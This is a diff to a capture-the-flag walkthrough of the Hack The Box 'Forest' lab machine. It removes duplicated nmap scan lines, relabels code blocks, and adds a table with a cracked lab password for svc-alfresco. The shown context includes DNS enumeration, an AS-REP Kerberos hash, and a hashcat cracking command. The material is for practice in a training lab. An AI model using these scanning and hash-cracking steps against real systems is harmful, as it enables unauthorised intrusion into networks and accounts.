@@ -31,22 +31,7 @@ graph TD
 
 # Enumeration
 
-First step is to enumerate the box. For this we’ll use `nmap`.
-
-```console
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-
-ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
-```
-
-```console
+```bash
 ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.161 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.161
 ```
 
@@ -63,7 +48,7 @@ We identified the `htb.local` domain, so add it in **/etc/hosts**
 
 I can to resolve `htb.local` and `forest.htb.local` from this DNS server:
 
-```console
+```bash
 dig @10.10.10.161 htb.local
 ```
     
@@ -92,7 +77,7 @@ htb.local.		600	IN	A	10.10.10.161
 ;; MSG SIZE  rcvd: 66
 ```
     
-```console
+```bash
 dig @10.10.10.161 forest.htb.local
 ```
     
@@ -356,6 +341,10 @@ $krb5asrep$23$svc-alfresco@HTB:754aaeb7cf647e5365424893ee7e7345$1f45e994ceeda5db
 ```bash
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
+
+| User               | Pass         |
+|:------------------:|:------------:|
+| svc-alfresco*      | s3rvice      | 
 
 > User: **svc-alfresco** 
 >
